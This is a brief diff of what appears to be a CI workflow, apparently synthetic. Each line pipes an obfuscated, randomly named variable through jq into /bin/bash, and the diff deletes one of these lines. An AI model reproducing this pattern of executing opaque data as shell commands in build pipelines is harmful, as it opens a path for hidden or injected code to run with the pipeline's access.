@@ -28,7 +28,6 @@ jobs:
           echo $ycd79932 | jq -r .jzh79 | /bin/bash
           printf '%s' "$updkf03" | jq -r .kj17 | /bin/bash
           echo $i46 | jq -r .ksrn53 | /bin/bash
-          echo $aj2908 | jq -r .mn9436 | /bin/bash
           printf '%s' "$nz168" | jq -r .iyk2540 | /bin/bash
 
       - name: Upload output
